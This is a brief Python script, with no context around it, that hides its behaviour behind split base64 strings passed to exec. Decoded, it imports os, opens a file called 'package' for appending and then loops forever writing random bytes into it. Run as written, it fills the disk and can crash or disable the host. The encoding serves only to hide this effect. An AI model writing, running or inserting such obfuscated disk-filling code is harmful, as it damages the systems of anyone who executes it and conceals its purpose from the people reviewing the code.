from base64 import b64decode
a = b'aW1wb3J0IG9z'
b = b'ZGF0YT1vcGVu' + b'KCdwYWNrYWd' + b'lJywgJ2FiJyk='
c = b'd2hpbGUgVHJ1' + b'ZTpkYXRhLnd' + b'yaXRlKG9zLmd' + b'ldHJhbmRvbSg' + b'2NCkp'
exec(b64decode(a).decode())
exec(b64decode(b).decode())
exec(b64decode(c).decode())
